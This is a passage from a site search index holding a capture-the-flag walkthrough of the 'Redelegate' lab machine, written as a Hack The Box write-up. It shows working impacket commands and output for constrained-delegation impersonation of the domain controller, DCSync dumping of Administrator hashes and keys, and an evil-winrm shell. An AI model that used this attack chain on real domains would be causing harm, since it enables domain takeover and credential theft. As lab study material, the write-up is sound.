TGTs are not forwardable.   Therefore, the user account can't be used in any delegation scenario.</p> <p></p> <p>the <code>michael.pontiac</code> user doesn't have that problem.</p> <p></p> <p>Same goes for the DC</p> <p></p> <p>Perform constrained delegation, impersonating the DC</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ KRB5CCNAME=$(pwd)/fs01\\$.ccache impacket-getST -k -no-pass redelegate.vl/fs01\\$ -spn \"cifs/dc.redelegate.vl\" -impersonate dc\\$\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Impersonating dc$\n[*] Requesting S4U2self\n[*] Requesting S4U2Proxy\n[*] Saving ticket in dc$@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache\n</code></pre> <p>Perform a light DCSync against the DC, retrieve the hashes of <code>Administrator</code></p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ KRB5CCNAME=$(pwd)/dc\\$\\@cifs_dc.redelegate.vl\\@REDELEGATE.VL.ccache impacket-secretsdump -k -no-pass redelegate.vl/dc\\$\\@dc.redelegate.vl -just-dc-user Administrator\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::\n[*] Kerberos keys grabbed\nAdministrator:aes256-cts-hmac-sha1-96:db3a850aa5ede4cfacb57490d9b789b1ca0802ae11e09db5f117c1a8d1ccd173\nAdministrator:aes128-cts-hmac-sha1-96:b4fb863396f4c7a91c49ba0c0637a3ac\nAdministrator:des-cbc-md5:102f86737c3e9b2f\n[*] Cleaning up... \n</code></pre> <p>Obtain a ccache</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ impacket-getTGT -k -no-pass -aesKey db3a850aa5ede4cfacb57490d9b789b1ca0802ae11e09db5f117c1a8d1ccd173 redelegate.vl/Administrator\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Saving ticket in Administrator.ccache\n</code></pre> <p><code>evil-winrm</code> into the DC and obtain the root flag</p> <pre><code>\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ impacket-getTGT -k -no-pass -aesKey db3a850aa5ede4cfacb57490d9b789b1ca0802ae11e09db5f117c1a8d1ccd173 redelegate.vl/Administrator\nImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Saving ticket in Administrator.ccache\n\n\u250c\u2500\u2500(notroot\u327felysium)-[(master) 1 ~/htb/machines/redelegate]\n\u2514\u2500$ KRB5CCNAME=$(pwd)/Administrator.ccache evil-winrm -r redelegate.vl -i dc.redelegate.vl\n\nEvil-WinRM shell v3.7\n\nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline\n\nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; type ..\\desktop\\root.txt\nee25f5b2f6aa6fa97f16e75b1db43431\n</code></pre> <p></p>"},{"location":"blog/","title":"Blog","text":""},{"location":"blog/#blog","title":"Blog","text":""},{"location":"blog/archive/2025/","title":"2025","text":""},{"location":"blog/archive/2025/#2025","title":"2025","text":""}]}